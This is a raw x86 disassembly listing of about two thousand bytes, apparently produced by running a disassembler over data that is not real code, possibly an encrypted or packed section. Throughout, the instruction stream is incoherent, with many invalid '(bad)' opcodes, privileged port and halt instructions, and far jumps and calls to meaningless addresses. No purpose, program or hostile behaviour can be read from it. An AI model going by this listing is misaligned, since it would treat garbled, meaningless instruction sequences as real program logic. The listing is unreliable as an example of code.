  411665:	fsub   QWORD PTR es:[ecx-0x4b]
  411669:	jne    0x41167e
  41166b:	add    BYTE PTR [esi-0x457411b7],dh
  411671:	addr16 jb 0x4116c3
  411674:	mov    edi,0xcdfc7297
  411679:	imul   edi,DWORD PTR [ebp+0x6c21139a],0xffffffa5
  411680:	cs out dx,al
  411682:	aaa    
  411683:	sbb    edx,esi
  411685:	pusha  
  411686:	out    dx,al
  411687:	fadd   DWORD PTR [edi]
  411689:	test   DWORD PTR [ebp-0x66a98017],esi
  41168f:	push   es
  411690:	nop
  411691:	pusha  
  411692:	push   ecx
  411693:	jge    0x4116ae
  411695:	xchg   DWORD PTR [eax-0x5ba9206f],edi
  41169b:	mov    dl,BYTE PTR [ebp-0x5f69df2f]
  4116a1:	rol    DWORD PTR [ebp+0x76e598de],0x9d
  4116a8:	nop
  4116a9:	push   0x1a9ca1a8
  4116ae:	xor    al,0x51
  4116b0:	pop    esp
  4116b1:	mov    cl,0x69
  4116b3:	or     eax,0x8e8a9ffc
  4116b8:	(bad)  
  4116b9:	mov    eax,ds:0x6c37135f
  4116be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116bf:	mov    bh,0x30
  4116c1:	jne    0x4116f2
  4116c3:	xor    al,0x72
  4116c5:	push   0x0
  4116c7:	leave  
  4116c8:	in     eax,dx
  4116c9:	xchg   al,bl
  4116cb:	sub    al,0xa6
  4116cd:	enter  0x3e3d,0xf4
  4116d1:	and    DWORD PTR [edx+0x47],ecx
  4116d4:	fisub  WORD PTR [esi]
  4116d6:	push   ds
  4116d7:	sub    eax,DWORD PTR [edx]
  4116d9:	rol    DWORD PTR [edi],0xd4
  4116dc:	pop    edi
  4116dd:	test   al,0x5
  4116df:	lea    ebp,[ebp-0x49]
  4116e2:	fsubr  st,st(3)
  4116e4:	cmp    eax,0xbcb43221
  4116e9:	jmp    0x9f2fba3c
  4116ee:	xchg   ecx,eax
  4116ef:	adc    BYTE PTR [esi+0x368beb0d],ch
  4116f5:	or     al,0x75
  4116f7:	icebp  
  4116f8:	ins    BYTE PTR es:[edi],dx
  4116f9:	(bad)  
  4116fa:	dec    edi
  4116fb:	rcr    ebp,1
  4116fd:	(bad)  
  4116fe:	ins    BYTE PTR es:[edi],dx
  4116ff:	gs or  eax,0xe6d8bdfb
  411705:	fisub  DWORD PTR [edi]
  411707:	mov    cs,WORD PTR [esi+0x4d4b6137]
  41170d:	pop    esp
  41170e:	pop    esp
  41170f:	imul   esi,esi,0x5d595f83
  411715:	push   ebp
  411716:	pop    esi
  411717:	jmp    0x4116d6
  411719:	xchg   edx,eax
  41171a:	imul   ebx
  41171c:	(bad)  
  41171d:	dec    ebx
  41171e:	push   esp
  41171f:	pop    ebx
  411720:	sub    DWORD PTR [edi],0xa4a97c12
  411726:	sti    
  411727:	in     al,0xd4
  411729:	add    eax,DWORD PTR [edx-0x26c1a900]
  41172f:	dec    edx
  411730:	(bad)  
  411731:	out    0x3c,eax
  411733:	out    dx,eax
  411734:	cmp    eax,0xe515c456
  411739:	mov    WORD PTR [esi],?
  41173b:	dec    esp
  41173c:	repz and eax,0xd559e1ad
  411742:	mov    ebp,0xf1f8a9f3
  411747:	test   al,0x3e
  411749:	sub    BYTE PTR [eax],cl
  41174b:	push   eax
  41174c:	jns    0x411710
  41174e:	sub    eax,DWORD PTR [eax+0xee8ebfe]
  411754:	dec    ebx
  411755:	addr16 inc edi
  411757:	mov    bl,0xb
  411759:	push   cs
  41175a:	and    al,0x6f
  41175c:	cld    
  41175d:	js     0x4117a8
  41175f:	push   edi
  411760:	and    al,dh
  411762:	imul   edi,edx,0xb08540cb
  411768:	js     0x411714
  41176a:	fisub  WORD PTR [ecx-0x91cf9b7]
  411770:	xlat   BYTE PTR ds:[ebx]
  411771:	into   
  411772:	pop    es
  411773:	fist   WORD PTR [ebp-0x58]
  411776:	popa   
  411777:	cmp    cl,BYTE PTR [ebp-0x2e]
  41177a:	fs clc 
  41177c:	jmp    0x41178e
  41177e:	adc    ecx,DWORD PTR [eax+0x69cd2691]
  411784:	xor    edx,edx
  411786:	push   ebp
  411787:	mov    al,0x1a
  411789:	mov    cl,0xb4
  41178b:	mov    WORD PTR [ebp+ecx*2+0x12],ss
  41178f:	add    BYTE PTR [ebx+0x94a0650],0x73
  411796:	push   0x4d47d24b
  41179b:	mov    bh,0x69
  41179d:	xchg   ebp,eax
  41179e:	inc    ebx
  41179f:	popa   
  4117a0:	aaa    
  4117a1:	xor    DWORD PTR [edx],esi
  4117a3:	xor    dl,BYTE PTR [ecx]
  4117a5:	xchg   edi,eax
  4117a6:	fmulp  st(2),st
  4117a8:	jmp    0x411772
  4117aa:	sbb    BYTE PTR [ebp+ecx*1-0x1a],ch
  4117ae:	out    0xfb,eax
  4117b0:	cmp    DWORD PTR [esi-0x4df6e48d],ebp
  4117b6:	adc    ebp,DWORD PTR [ecx]
  4117b8:	int3   
  4117b9:	call   0x4e0a:0x44b3fbbc
  4117c0:	addr16 pop ebx
  4117c2:	mov    bh,0x1c
  4117c4:	stc    
  4117c5:	ret    
  4117c6:	nop
  4117c7:	rcr    BYTE PTR [edi-0xf],1
  4117ca:	dec    esp
  4117cb:	jp     0x4117bf
  4117cd:	and    eax,0xd0fc0c4c
  4117d2:	inc    edx
  4117d3:	or     DWORD PTR [ecx-0x55372d93],esi
  4117d9:	jno    0x411791
  4117db:	aad    0xb3
  4117dd:	pop    eax
  4117de:	jno    0x4117db
  4117e0:	adc    eax,0x21aed1bf
  4117e5:	pusha  
  4117e6:	int3   
  4117e7:	icebp  
  4117e8:	sbb    DWORD PTR [edx-0x41],0xffffffc3
  4117ec:	repz (bad) 
  4117ef:	shr    BYTE PTR [edi],cl
  4117f1:	test   al,0x27
  4117f3:	mov    esp,0xd4b54528
  4117f8:	xor    DWORD PTR [ebx+0xe],eax
  4117fb:	adc    eax,0x40cac0e5
  411800:	push   esp
  411801:	cmp    bl,BYTE PTR [ebx-0x6d0499f3]
  411807:	in     eax,0x78
  411809:	pop    edi
  41180a:	fldenv [edx+0x2c6dc78c]
  411810:	ficom  DWORD PTR [eax+0x5f739012]
  411816:	in     eax,0xa7
  411818:	mov    ds:0x6a2b989b,al
  41181d:	sbb    DWORD PTR [edx+eax*8-0x268cc0f6],edi
  411824:	jo     0x4117f0
  411826:	cld    
  411827:	inc    ecx
  411828:	ror    edx,0x85
  41182b:	adc    bl,BYTE PTR fs:[eax+0x7ffa9df5]
  411832:	inc    edi
  411833:	pop    ebp
  411834:	adc    dl,dh
  411836:	(bad)  
  411837:	and    BYTE PTR [ebp+0x0],al
  41183a:	or     eax,esp
  41183c:	dec    esp
  41183d:	mov    al,ds:0x56019e79
  411842:	mov    ebx,0x11d7fa9d
  411847:	es pop esi
  411849:	imul   eax,DWORD PTR [ebx-0x2d8f4e24],0xffffffad
  411850:	enter  0x2ebb,0xa3
  411854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411855:	aas    
  411856:	xchg   edx,eax
  411857:	xor    al,BYTE PTR [eax-0x49]
  41185a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41185b:	(bad)  
  41185c:	mov    ebx,0xcfdbef3
  411861:	jp     0x4118a2
  411863:	cmp    al,0xe7
  411865:	mov    dh,dh
  411867:	push   ss
  411868:	shl    DWORD PTR [eax+0x781cf439],0xf6
  41186f:	aad    0xaf
  411871:	mov    bl,ah
  411873:	inc    eax
  411874:	inc    edx
  411875:	ret    
  411876:	mov    al,ds:0xdd874dbb
  41187b:	cmp    eax,0xaa5aa26a
  411880:	xor    dl,BYTE PTR [esi+0x1c0eb72b]
  411886:	hlt    
  411887:	ds retf 0x3f6e
  41188b:	inc    ecx
  41188c:	or     BYTE PTR ds:[eax-0x27],dh
  411890:	mov    al,BYTE PTR ds:[ecx-0x1252be0a]
  411897:	ins    BYTE PTR es:[edi],dx
  411898:	std    
  411899:	std    
  41189a:	jl     0x411903
  41189c:	mov    esi,0xab99a919
  4118a1:	dec    edi
  4118a2:	jmp    0x5fcb:0xe2b26d2
  4118a9:	or     eax,0x117918cf
  4118ae:	loope  0x4118ca
  4118b0:	fsubr  DWORD PTR [ebx+0x7e56451b]
  4118b6:	repnz xchg ecx,eax
  4118b8:	mov    dl,0xa4
  4118ba:	pop    es
  4118bb:	into   
  4118bc:	out    dx,eax
  4118bd:	cmp    ch,BYTE PTR [ecx-0x1f]
  4118c0:	push   ebx
  4118c1:	xchg   edi,eax
  4118c2:	int    0xd4
  4118c4:	adc    BYTE PTR [ebp-0x30e19332],cl
  4118ca:	xor    ch,bh
  4118cc:	popf   
  4118cd:	and    BYTE PTR [edi+0x75],al
  4118d0:	arpl   WORD PTR [edx+0x6c],di
  4118d3:	xchg   ebx,eax
  4118d4:	pmullw mm7,QWORD PTR [eax-0x63]
  4118d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d9:	fidiv  WORD PTR [ecx-0x24]
  4118dc:	mov    cl,0x6b
  4118de:	jns    0x411867
  4118e0:	push   es
  4118e1:	xor    bl,BYTE PTR ds:0xf5680996
  4118e7:	xchg   ebp,eax
  4118e8:	inc    edi
  4118e9:	sbb    al,0xdd
  4118eb:	leave  
  4118ec:	sub    BYTE PTR [esi],al
  4118ee:	stc    
  4118ef:	(bad)  
  4118f1:	mov    ds:0xa67a2a49,al
  4118f6:	dec    ebp
  4118f7:	aam    0x5
  4118f9:	jo     0x4118b8
  4118fb:	stos   DWORD PTR es:[edi],eax
  4118fc:	adc    bl,bh
  4118fe:	dec    ebx
  4118ff:	in     eax,0xe9
  411901:	xchg   edi,eax
  411902:	mov    BYTE PTR [ebx-0xd],0xc4
  411906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411907:	xor    al,0xf3
  411909:	add    dl,BYTE PTR [ebp+0x4a54c5dc]
  41190f:	add    eax,0x3d9b0066
  411914:	mov    esi,0x5b8ed1ff
  411919:	pop    es
  41191a:	dec    ebx
  41191b:	jmp    0x9bff4fe9
  411920:	(bad)  
  411921:	and    dl,bl
  411923:	cdq    
  411924:	xchg   edi,eax
  411925:	aaa    
  411926:	inc    eax
  411927:	dec    ecx
  411928:	out    0x68,eax
  41192a:	ins    DWORD PTR es:[edi],dx
  41192b:	loopne 0x4118da
  41192d:	fcomp  DWORD PTR [ebp+0x76e5ffa9]
  411933:	pop    edx
  411934:	cmp    edi,esp
  411936:	pop    esp
  411937:	shr    BYTE PTR [edi+0x3d],0xf8
  41193b:	ss push 0xa1c8e036
  411941:	adc    bl,BYTE PTR [ebx]
  411943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411944:	cmp    eax,0xa59e16ab
  411949:	jecxz  0x4118f1
  41194b:	ror    DWORD PTR [ebp+0x5],cl
  41194e:	aaa    
  41194f:	push   ebx
  411950:	pop    eax
  411951:	add    eax,0xd6133ea1
  411956:	jmp    0x411943
  411958:	hlt    
  411959:	pop    ecx
  41195a:	sbb    dl,BYTE PTR [esi-0x75]
  41195d:	jmp    0x3ade800a
  411962:	loopne 0x411942
  411964:	popa   
  411965:	xchg   esi,eax
  411966:	cli    
  411967:	inc    eax
  411968:	les    esi,FWORD PTR [esi+0x27]
  41196b:	mov    BYTE PTR [esi],dh
  41196d:	in     al,dx
  41196e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41196f:	ret    
  411970:	(bad)  
  411971:	and    ebx,0xffffffca
  411974:	(bad)  
  411975:	ins    DWORD PTR es:[edi],dx
  411976:	clc    
  411977:	sub    al,0x79
  411979:	(bad)  
  41197a:	fs push eax
  41197c:	or     ebp,DWORD PTR [esi+ebp*8+0x658f6c07]
  411983:	dec    ecx
  411984:	sbb    BYTE PTR [ecx+0xff14216],cl
  41198a:	cmp    DWORD PTR [edx+0x6aec5d03],ecx
  411990:	outs   dx,BYTE PTR ds:[esi]
  411991:	mov    eax,0x4390a4e6
  411996:	mov    al,0x9a
  411998:	inc    eax
  411999:	retf   0x6f29
  41199c:	mov    gs,WORD PTR [edx+0x7b05d211]
  4119a2:	dec    edx
  4119a3:	lods   eax,DWORD PTR ds:[esi]
  4119a4:	mov    cl,0x1f
  4119a6:	lods   al,BYTE PTR ds:[esi]
  4119a7:	add    al,0x3e
  4119a9:	cs dec edi
  4119ab:	add    eax,0x65fe3842
  4119b0:	pop    edi
  4119b1:	xchg   ebp,eax
  4119b2:	(bad)  
  4119b3:	enter  0x9d15,0xe2
  4119b7:	inc    ecx
  4119b8:	retf   
  4119b9:	xchg   ebx,eax
  4119ba:	mov    bh,0x85
  4119bc:	xor    al,0x2c
  4119be:	enter  0x350,0xa
  4119c2:	ja     0x4119fd
  4119c4:	ins    BYTE PTR es:[edi],dx
  4119c5:	jnp    0x411952
  4119c7:	mov    ds:0xfb24053c,eax
  4119cc:	jno    0x41196f
  4119ce:	(bad)  
  4119cf:	dec    edi
  4119d0:	pushf  
  4119d1:	mov    al,ds:0xa5604c8e
  4119d6:	loopne 0x4119ed
  4119d8:	mov    ds:0xd4f559a5,eax
  4119dd:	add    BYTE PTR [esi-0x29769863],dh
  4119e3:	sub    DWORD PTR [ecx+0x7e],0x38
  4119e7:	xchg   edx,eax
  4119e8:	popf   
  4119e9:	sbb    DWORD PTR [esi+0x2f1ba5a6],eax
  4119ef:	jno    0x4119ce
  4119f1:	jmp    0xa5719c91
  4119f6:	into   
  4119f7:	out    dx,eax
  4119f8:	ret    
  4119f9:	test   DWORD PTR [eax-0x12a2f95f],eax
  4119ff:	cmp    BYTE PTR [edx+0xdc83cec],0x39
  411a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a07:	(bad)  
  411a08:	scas   al,BYTE PTR es:[edi]
  411a09:	lods   al,BYTE PTR ds:[esi]
  411a0a:	aaa    
  411a0b:	in     al,dx
  411a0c:	pop    edx
  411a0d:	scas   al,BYTE PTR es:[edi]
  411a0e:	pusha  
  411a0f:	jle    0x411a7b
  411a11:	jge    0x411a26
  411a13:	test   eax,0xc45b53d4
  411a18:	sub    BYTE PTR [edx+0x6caec302],0x4
  411a1f:	out    dx,al
  411a20:	mov    esi,0x1c077f21
  411a25:	int    0x85
  411a27:	inc    esp
  411a28:	xchg   ebx,eax
  411a29:	adc    al,0x55
  411a2c:	xchg   ecx,eax
  411a2d:	xor    DWORD PTR [eax],ebx
  411a2f:	push   ss
  411a30:	shl    ecx,0xc9
  411a33:	or     al,0xed
  411a35:	mov    eax,0xef8029c2
  411a3a:	inc    esp
  411a3b:	mov    BYTE PTR fs:[edx-0x75],cl
  411a3f:	jge    0x411a74
  411a41:	lahf   
  411a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a43:	cmp    al,0x9e
  411a45:	retf   0x15c3
  411a48:	call   0x92b7:0xc39fc22c
  411a4f:	outs   dx,BYTE PTR es:[esi]
  411a51:	fld    st(4)
  411a53:	test   edx,esp
  411a55:	push   esp
  411a56:	jp     0x411a37
  411a58:	test   BYTE PTR [ebx+0x7b],dl
  411a5b:	xchg   BYTE PTR [ebx+0x513debb9],dl
  411a61:	imul   ebp,edx,0x39
  411a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a65:	in     al,dx
  411a66:	pop    DWORD PTR [edi-0x1]
  411a69:	jp     0x411a1f
  411a6b:	and    BYTE PTR [edi-0x7f],al
  411a6e:	out    dx,eax
  411a6f:	pop    ss
  411a70:	sbb    eax,0x6ab840ef
  411a75:	stos   DWORD PTR es:[edi],eax
  411a76:	xchg   DWORD PTR [ecx-0x62],ebx
  411a79:	xchg   esi,eax
  411a7a:	sbb    ebx,DWORD PTR [ebp-0x59616352]
  411a80:	add    DWORD PTR [eax-0x65859676],0xffffffe4
  411a87:	nop
  411a88:	popa   
  411a89:	lahf   
  411a8a:	dec    ebp
  411a8b:	inc    ecx
  411a8c:	(bad)  
  411a8d:	fs pop ecx
  411a8f:	cmp    ebp,ecx
  411a91:	stc    
  411a92:	xchg   DWORD PTR [edx+0x69],edi
  411a95:	sbb    bl,BYTE PTR [eax-0x25ee8f4d]
  411a9b:	cmp    ch,ch
  411a9d:	sub    eax,0x6db1439d
  411aa2:	dec    ecx
  411aa3:	xor    ecx,DWORD PTR [edx+0x33]
  411aa6:	loopne 0x411aa4
  411aa8:	sub    eax,0x1375ef3b
  411aad:	xchg   ebp,eax
  411aae:	push   ebp
  411aaf:	mov    bh,bl
  411ab1:	(bad)  
  411ab2:	icebp  
  411ab3:	xchg   BYTE PTR [edi+0x44e7f4ab],bh
  411ab9:	dec    ebx
  411aba:	sbb    ebp,0xffffffa2
  411abd:	add    eax,0xaeabd1d5
  411ac2:	pop    eax
  411ac3:	push   cs
  411ac4:	xlat   BYTE PTR ds:[ebx]
  411ac5:	pop    ds
  411ac6:	inc    ebp
  411ac7:	addr16 pop es
  411ac9:	jg     0x411ae0
  411acb:	adc    ch,0xd2
  411ace:	dec    esp
  411acf:	pop    es
  411ad0:	push   esp
  411ad1:	add    DWORD PTR [ebp+0x28c4044a],ebp
  411ad7:	sbb    eax,0x78000351
  411adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411add:	dec    ebp
  411ade:	test   ecx,ebp
  411ae0:	mov    DWORD PTR [edx+0x5b3c73ec],eax
  411ae6:	call   0x25ef:0x5c37489c
  411aed:	add    dl,BYTE PTR [eax]
  411aef:	xor    al,0x74
  411af1:	adc    ecx,DWORD PTR [ebx]
  411af3:	and    al,BYTE PTR [edx+0x0]
  411af6:	sub    bh,BYTE PTR [ebp+0x704276fb]
  411afc:	xchg   esp,eax
  411afd:	fs xor eax,0xd3590870
  411b03:	lea    edx,[eax+0x79]
  411b06:	ins    DWORD PTR es:[edi],dx
  411b07:	sahf   
  411b08:	ins    DWORD PTR es:[edi],dx
  411b09:	lods   al,BYTE PTR ds:[esi]
  411b0a:	shr    ecx,cl
  411b0c:	and    eax,0xed3ac779
  411b11:	sub    ecx,DWORD PTR [esi+ebp*4-0x17]
  411b15:	mov    esp,gs
  411b17:	sti    
  411b18:	jne    0x411b35
  411b1a:	popa   
  411b1b:	push   edx
  411b1c:	dec    ebx
  411b1d:	scas   eax,DWORD PTR es:[edi]
  411b1e:	and    eax,0xbaeeeb36
  411b23:	(bad)  
  411b24:	mov    eax,DWORD PTR [esi-0x2e77e400]
  411b2a:	in     al,0xc4
  411b2c:	pop    ebp
  411b2d:	fdiv   DWORD PTR [eax-0x35d25ac3]
  411b33:	sahf   
  411b34:	mov    edx,0x8509b210
  411b39:	pop    ebp
  411b3a:	push   ebx
  411b3b:	fistp  DWORD PTR [ebp-0x26bb4dee]
  411b41:	retf   0x8cfa
  411b44:	mov    ebp,0xc085c657
  411b49:	leave  
  411b4a:	mov    eax,?
  411b4c:	push   ds
  411b4d:	lock jnp 0x411b1c
  411b50:	fmul   st(5),st
  411b52:	(bad)  
  411b53:	jge    0x411b4a
  411b55:	sti    
  411b56:	dec    esp
  411b57:	scas   al,BYTE PTR es:[edi]
  411b58:	dec    edi
  411b59:	gs sub cl,bh
  411b5c:	add    BYTE PTR [eax-0x2483551],al
  411b62:	ds int3 
  411b64:	and    ah,bh
  411b66:	out    0xeb,al
  411b68:	scas   eax,DWORD PTR es:[edi]
  411b69:	mov    ds:0x3b2ba50a,al
  411b6e:	or     al,0x17
  411b70:	pop    ebp
  411b71:	sbb    DWORD PTR [esi-0x2f],edx
  411b74:	sbb    BYTE PTR [ebp-0x1087c8c6],dl
  411b7a:	ins    DWORD PTR es:[edi],dx
  411b7b:	cmp    BYTE PTR [ecx-0x72],bh
  411b7e:	mov    ebx,0x274006dc
  411b83:	(bad)
  411b86:	mov    al,0x94
  411b88:	mov    esi,0xc0885048
  411b8d:	jl     0x411bca
  411b8f:	cwde   
  411b90:	mov    ebp,0x8b9bc130
  411b95:	jno    0x411bfc
  411b97:	stos   DWORD PTR es:[edi],eax
  411b98:	stos   BYTE PTR es:[edi],al
  411b99:	xchg   edx,eax
  411b9a:	sahf   
  411b9b:	or     eax,0x77
  411b9e:	(bad)  
  411b9f:	push   eax
  411ba0:	call   0xc613:0x7dedf45
  411ba7:	add    al,0xe2
  411ba9:	mov    WORD PTR [ebx],cs
  411bab:	lock mov dh,0xf
  411bae:	cmp    DWORD PTR [edx+ebx*4-0x4e0bd779],esp
  411bb5:	sub    BYTE PTR [eax+esi*2],ah
  411bb8:	lods   al,BYTE PTR ds:[esi]
  411bb9:	add    BYTE PTR [ecx+0x4b345812],0xf9
  411bc0:	bound  eax,QWORD PTR [ebx+0x58ea0c2]
  411bc6:	adc    esp,DWORD PTR gs:[esi+edi*1-0x7f]
  411bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bcc:	sbb    DWORD PTR [ebx-0x372c59cf],edx
  411bd2:	cmp    eax,0xf15cf898
  411bd7:	fld    QWORD PTR ds:0xa798226
  411bdd:	push   ecx
  411bde:	mov    esp,0x5ce88b4c
  411be3:	mov    cl,0xbb
  411be5:	or     al,0xcd
  411be7:	test   DWORD PTR [ebx-0x19],ebp
  411bea:	cmp    DWORD PTR [ecx],esp
  411bec:	cmp    al,ah
  411bee:	nop
  411bef:	(bad)  
  411bf0:	ss inc ebp
  411bf2:	retf   
  411bf3:	sti    
  411bf4:	jns    0x411c23
  411bf6:	mov    dh,0x8c
  411bf8:	ins    DWORD PTR es:[edi],dx
  411bf9:	outs   dx,DWORD PTR ds:[esi]
  411bfa:	xchg   BYTE PTR [esi],dh
  411bfc:	loope  0x411c1b
  411bfe:	jmp    0x6a64:0x310bdfd2
  411c05:	or     ecx,DWORD PTR [eax-0x61]
  411c08:	repz adc eax,0x921bf07a
  411c0e:	cmp    DWORD PTR [edi+0x194db1ff],ebp
  411c14:	jecxz  0x411bee
  411c16:	mov    esp,0xab63dbeb
  411c1b:	jne    0x411c99
  411c1d:	inc    ebp
  411c1e:	xchg   ebx,eax
  411c1f:	jb     0x411bcd
  411c21:	push   ebp
  411c22:	sub    eax,0x75efbf72
  411c27:	pop    ds
  411c28:	shl    BYTE PTR [edi-0x6f5eda15],cl
  411c2e:	out    dx,eax
  411c2f:	jmp    0xfe40:0x42d61694
  411c36:	or     eax,0x12807181
  411c3b:	gs dec esp
  411c3d:	ins    DWORD PTR es:[edi],dx
  411c3e:	mov    dl,0x8c
  411c40:	std    
  411c41:	mov    ah,0x38
  411c43:	sbb    DWORD PTR [ebx-0x28],esp
  411c46:	push   ss
  411c47:	sti    
  411c48:	pop    ds
  411c49:	jnp    0x411bd7
  411c4b:	ins    BYTE PTR es:[edi],dx
  411c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4d:	stos   DWORD PTR es:[edi],eax
  411c4e:	sti    
  411c4f:	shl    DWORD PTR [ebp+0x296b8843],1
  411c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c56:	ret    
  411c57:	aas    
  411c58:	push   ecx
  411c59:	and    BYTE PTR [ecx-0x15596125],0x44
  411c60:	bound  edx,QWORD PTR [esi+0x4ad5ca75]
  411c66:	ds jo  0x411c7f
  411c69:	or     edx,ebx
  411c6b:	jnp    0x411c73
  411c6d:	xchg   esi,eax
  411c6e:	xor    al,BYTE PTR [eax+0x32]
  411c71:	xchg   ebp,eax
  411c72:	and    ah,BYTE PTR [eax+0x51]
  411c75:	add    al,0x2e
  411c77:	inc    ecx
  411c78:	inc    esi
  411c79:	and    DWORD PTR [ebx],ebp
  411c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c7c:	cdq    
  411c7d:	sbb    BYTE PTR [ecx+0x22b8d639],cl
  411c83:	cmp    BYTE PTR [edx+0x7e],ah
  411c86:	pop    ds
  411c87:	xchg   esi,eax
  411c88:	or     bl,cl
  411c8a:	ja     0x411ceb
  411c8c:	xor    BYTE PTR [ebp-0x41612599],dl
  411c92:	shr    edx,1
  411c94:	inc    ecx
  411c95:	pop    ds
  411c96:	push   eax
  411c97:	loope  0x411c34
  411c99:	add    DWORD PTR [ecx+0x71a8522c],ebx
  411c9f:	shl    ebx,1
  411ca1:	fdivr  DWORD PTR [edi+0x7a]
  411ca4:	fisubr WORD PTR [ecx+ebp*4+0x136ce429]
  411cab:	cmp    DWORD PTR [esi-0x25664b16],0x61
  411cb2:	mov    DWORD PTR [edi],edx
  411cb4:	scas   al,BYTE PTR es:[edi]
  411cb5:	jae    0x411cb5
  411cb7:	jns    0x411cab
  411cb9:	mov    BYTE PTR [ecx],bh
  411cbb:	pop    ecx
  411cbc:	fist   WORD PTR ds:0x5000f1bb
  411cc2:	(bad)  
  411cc4:	stos   BYTE PTR es:[edi],al
  411cc5:	fwait
  411cc6:	mov    ah,0x96
  411cc8:	into   
  411cc9:	mov    bl,0x22
  411ccb:	outs   dx,BYTE PTR ds:[esi]
  411ccc:	pop    edx
  411ccd:	popa   
  411cce:	xchg   edx,eax
  411ccf:	inc    eax
  411cd0:	mov    bl,0xf6
  411cd2:	sub    dh,BYTE PTR [ecx-0x2f]
  411cd5:	dec    esp
  411cd6:	dec    ebx
  411cd7:	adc    BYTE PTR [esi+0x67],ch
  411cda:	and    al,0x95
  411cdc:	jmp    0xa75daa1c
  411ce1:	sar    bl,1
  411ce3:	dec    ebp
  411ce4:	imul   ebp,ecx,0x9c24fac2
  411cea:	int    0x99
  411cec:	or     ebp,ebx
  411cee:	mov    dl,0x9
  411cf0:	(bad)  
  411cf2:	addr16 cdq 
  411cf4:	rcl    DWORD PTR [esi+0x179d1d7c],0xc3
  411cfb:	retw   0xee9a
  411cff:	mov    esp,0x7fa45e8b
  411d04:	repnz sbb al,0x93
  411d07:	pop    ebp
  411d08:	scas   al,BYTE PTR es:[edi]
  411d09:	mov    esp,0xd1ac3e6d
  411d0e:	sar    BYTE PTR [ecx+0x29f7df4],1
  411d14:	add    BYTE PTR [eax-0x6364600c],cl
  411d1a:	pop    es
  411d1b:	add    BYTE PTR [edi],bh
  411d1d:	xor    dl,BYTE PTR [ebx]
  411d1f:	jnp    0x411cfb
  411d21:	pop    esi
  411d22:	inc    edx
  411d23:	jne    0x411ce6
  411d25:	dec    eax
  411d26:	pushf  
  411d27:	or     DWORD PTR [ebx-0x15caf889],ecx
  411d2d:	xchg   esi,eax
  411d2e:	xor    eax,0xf9ca3380
  411d33:	out    dx,al
  411d34:	pop    esp
  411d35:	cli    
  411d36:	aam    0x73
  411d38:	add    DWORD PTR [edx],edx
  411d3a:	jo     0x411d0f
  411d3c:	aad    0x9
  411d3e:	mov    ecx,0x4a63379e
  411d43:	mov    al,0x42
  411d45:	cmp    BYTE PTR [eax+0x36adbb02],dh
  411d4b:	and    DWORD PTR [ebp+0x6943a794],ebx
  411d51:	cmc    
  411d52:	sub    edx,DWORD PTR [esi-0x6a]
  411d55:	(bad)  
  411d56:	sub    eax,DWORD PTR [ecx+0x66dc3262]
  411d5c:	lods   eax,DWORD PTR ds:[esi]
  411d5d:	addr16 popa 
  411d5f:	cmp    BYTE PTR [ebp+0x6b17e1d3],ch
  411d65:	jns    0x411de0
  411d67:	mov    ch,0x6a
  411d69:	sbb    ebp,0x2b493d17
  411d6f:	or     eax,0xacdb24af
  411d74:	call   0xa1a0:0xbae08980
  411d7b:	lock lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d7e:	popf   
  411d7f:	fnstenv [esp+edi*2+0x70c9a1ef]
  411d86:	jno    0x411dc0
  411d88:	adc    DWORD PTR [edx+0x93e5e7b],0xb501e0a6
  411d92:	cmp    al,0x45
  411d94:	lock scas al,BYTE PTR es:[edi]
  411d96:	mov    edi,0x3f30de54
  411d9b:	push   esp
  411d9c:	mov    ah,0xcb
  411d9e:	add    ecx,DWORD PTR [edi-0x57db2b31]
  411da4:	push   cs
  411da5:	jne    0x411da3
  411da7:	das    
  411da8:	repz and al,0x9a
  411dab:	jae    0x411da9
  411dad:	rcl    BYTE PTR [ebx+0x44],1
  411db0:	into   
  411db1:	inc    esi
  411db2:	(bad)  
  411db4:	jecxz  0x411df2
  411db6:	jp     0x411e0e
  411db8:	shl    DWORD PTR [esi+0x17cb13c0],1
  411dbe:	test   al,0xdb
  411dc0:	adc    eax,0x4699bdd9
  411dc5:	sub    BYTE PTR [edi+0x7400ab5f],dl
  411dcb:	(bad)  
  411dcc:	icebp  
  411dcd:	jp     0x411d68
  411dcf:	rcl    DWORD PTR ds:[edx+0x11],1
  411dd3:	jbe    0x411d85
  411dd5:	mov    ds:0xb2b1e497,eax
  411dda:	ficomp DWORD PTR [edi]
  411ddc:	pop    ebx
  411ddd:	dec    eax
  411dde:	(bad)  
  411ddf:	outs   dx,BYTE PTR ds:[esi]
  411de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411de1:	sbb    eax,0xb677042a
  411de6:	mov    al,ds:0x25e8dd67
  411deb:	test   DWORD PTR [eax],esp
  411ded:	xor    al,0x5
  411def:	pop    edx
  411df0:	sahf   
  411df1:	jecxz  0x411db0
  411df3:	xlat   BYTE PTR ds:[ebx]
  411df4:	push   eax
  411df5:	in     eax,dx
  411df6:	xchg   esi,eax
  411df7:	inc    esp
  411df9:	add    ch,BYTE PTR [esi+0x60]
  411dfc:	clc    
  411dfd:	push   ecx
  411dfe:	out    0x99,eax
  411e00:	cli    
  411e01:	punpckhwd mm3,QWORD PTR [edx]
  411e04:	add    edx,ebp
  411e06:	lock add edi,ebx
  411e09:	jns    0x411e8a
  411e0b:	imul   ecx,DWORD PTR [ecx],0xfffffff4
  411e0e:	test   BYTE PTR [eax+0x66978d95],bl
  411e14:	into   
  411e15:	fstp   TBYTE PTR [edi+0x57]
  411e18:	dec    eax
  411e19:	adc    DWORD PTR [ecx-0x34],ecx
  411e1c:	jno    0x411e10
  411e1e:	pop    esp
